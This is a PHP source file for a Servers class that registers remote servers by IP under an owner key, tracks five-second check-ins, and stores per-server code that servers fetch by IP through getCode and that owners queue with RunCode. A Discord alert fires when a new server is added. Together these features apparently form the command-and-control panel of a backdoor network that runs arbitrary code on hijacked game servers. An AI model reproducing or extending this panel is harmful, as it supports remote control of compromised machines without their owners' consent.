<?php

class Servers
{
    public static function CountServerForUser($fuck_key)
    {
        return $GLOBALS['DB']->Count("servers", ["fuck_key" => $fuck_key], ' ORDER BY id DESC');
    }

    public static function GetAllServers()
    {
        return $GLOBALS['DB']->GetContent("servers");
    }

    public static function EditServer(
        $ip,
        $cfg,
        $name,
        $players,
        $fuck_key
    ) {

        $date = time();

        try {
            $GLOBALS['DB']->Update("servers", ['ip_adress' => $ip], [
                "name" => $name,
                "cfg" => $cfg,
                "players" => $players,
                "fuck_key" => $fuck_key,
                "update_date" => $date
            ]);
            return "success";
        } catch (Exception $e) {
            return "error" . $e;
        }
    }

    public static function GetServer($id)
    {
        return $GLOBALS['DB']->GetContent('servers', ['id' => $id])[0];
    }

    public static function IsOnline($id)
    {
        $timeserver = Servers::GetServer($id)['update_date'];

        $timenow = time();

        $difference = $timenow - $timeserver;

        if ($difference > 5) {
            return false;
        } else {
            return true;
        }
    }

    public static function GetServerByFuckKey($fuckkey)
    {
        $result = $GLOBALS['DB']->GetContent('servers', ['fuck_key' => $fuckkey]);

        if (count($result) > 0) {
            return $result[0];
        }
    }

    public static function GetServerByIP($ip)
    {
        $result = $GLOBALS['DB']->GetContent('servers', ['ip_adress' => $ip]);

        if (count($result) > 0) {
            return $result[0];
        }
    }

    public static function CreateServer(
        $name,
        $players,
        $ip_adress,
        $fuck_key
    ) {

        $date = time();
        try {
            $GLOBALS['DB']->Insert("servers", [
                "name" => $name,
                "players" => $players,
                "ip_adress" => $ip_adress,
                "fuck_key" => $fuck_key,
                "update_date" => $date,
                "added_date" => $date
            ]);
            Servers::SendNotification(Account::GetUserByFuckKey($fuck_key)['discord_id'], $name, $ip_adress);
            return "success";
        } catch (Exception $e) {
            return "error" . $e;
        }
    }

    public static function getCode($ip)
    {
        $code = Servers::GetServerByIP($ip)["code"];

        if ($code != '') {
            try {
                return html_entity_decode($code);
            } catch (Exception $e) {
                return '';
            }
        } else {
            return '';
        }
    }

    public static function setCode($id, $code)
    {
        try {
            $GLOBALS['DB']->Update("servers", ['id' => $id], ["code" => $code]);
            return true;
        } catch (Exception $e) {
            return false;
        }
    }

    public static function RunCode(
        $id,
        $code
    ) {
        try {
            $GLOBALS['DB']->Update("servers", ['id' => $id], [
                "code" => $code
            ]);
            return "success";
        } catch (Exception $e) {
            return "error" . $e;
        }
    }

    public static function setCodeByIp($ip, $code)
    {
        try {
            $GLOBALS['DB']->Update("servers", ['ip_adress' => $ip], ["code" => $code]);
            return true;
        } catch (Exception $e) {
            return false;
        }
    }

    public static function IsExist($id)
    {
        if ($GLOBALS['DB']->Count("servers", ["id" => $id]) != 0) {
            return true;
        } else {
            return false;
        }

    }

    public static function SendNotification($discord_id, $name, $ip)
    {
        if (Account::NotifsDiscord($discord_id)) {
            $data = [
                'user' => $discord_id,
                'name' => $name,
                'ip' => $ip,
            ];

            $url = $GLOBALS['fetch_bot'];

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Authorization: Bearer ' . $GLOBALS['authorization_baerer'],
                'Content-Type: application/x-www-form-urlencoded',
            ]);

            $response = curl_exec($ch);

            if (curl_errno($ch)) {
                echo 'Erreur cURL : ' . curl_error($ch);
            }

            curl_close($ch);

            echo $response;
        }
    }
}
